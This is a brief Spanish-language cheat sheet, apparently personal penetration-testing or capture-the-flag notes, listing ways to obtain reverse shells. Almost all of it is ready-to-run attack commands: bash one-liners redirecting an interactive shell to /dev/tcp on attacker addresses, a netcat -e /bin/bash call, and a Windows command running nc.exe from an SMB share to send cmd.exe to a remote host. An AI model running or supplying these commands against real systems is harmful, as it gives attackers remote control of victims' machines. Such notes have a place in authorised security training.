# Shell y reverse Shell

En esta sección veremos varias formas de crear shell y reverse shell.

## Linux

Varias formas de crear shells en Linux.

#### Reverse shell desde linux a nuestra máquina.

```
bash -i >& /dev/tcp/10.10.14.49/443 0>&1
```

Tambien como parámetro bash.

```
bash -c "bash -i >& /dev/tcp/10.10.14.49/443 0>&1"
```

Si la máquina linux tiene **netcap**.

```
nc -e /bin/bash 10.10.14.31 443
```

## Windows

#### Ejecutar reverse shell desde recurso compartido

```
\\10.10.14.54\smbFolder\nc.exe -e cmd 10.10.14.54 443
```
